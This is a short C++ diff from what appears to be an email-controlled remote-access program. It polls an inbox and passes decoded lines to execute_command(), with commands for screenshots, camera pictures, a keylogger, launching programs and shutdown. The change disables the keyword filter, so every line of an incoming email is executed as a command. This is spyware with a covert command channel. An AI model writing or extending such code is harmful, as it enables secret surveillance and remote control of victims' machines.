@@ -88,8 +88,8 @@ void check_email_commands() {
       continue;
     }
 
-    cout << "=== FETCHED RAW EMAIL ===\n"
-         << readBuffer << "\n=========================\n";
+    // cout << "=== FETCHED RAW EMAIL ===\n"
+    //      << readBuffer << "\n=========================\n";
     string decoded = extract_plain_text_from_email(readBuffer);
     cerr << "=== DECODED ===\n" << decoded << "\n=================\n";
 
@@ -98,14 +98,15 @@ void check_email_commands() {
     string line;
     while (getline(iss, line)) {
       cout << line << '\n';
-      if (line.find("start_program") != string::npos ||
-          line.find("shutdown") != string::npos ||
-          line.find("COMMAND") != string::npos ||
-          line.find("list_program") != string::npos ||
-          line.find("get_picture") != string::npos ||
-          line.find("get_screenshot") != string::npos) {
+      // if (line.find("start_program") != string::npos ||
+      //     line.find("shutdown") != string::npos ||
+      //     line.find("COMMAND") != string::npos ||
+      //     line.find("list_program") != string::npos ||
+      //     line.find("get_picture") != string::npos ||
+      //     line.find("get_screenshot") != string::npos ||
+      //     line.find("keylogger") != string::npos) 
         execute_command(line);
-      }
+      
     }
   }
 
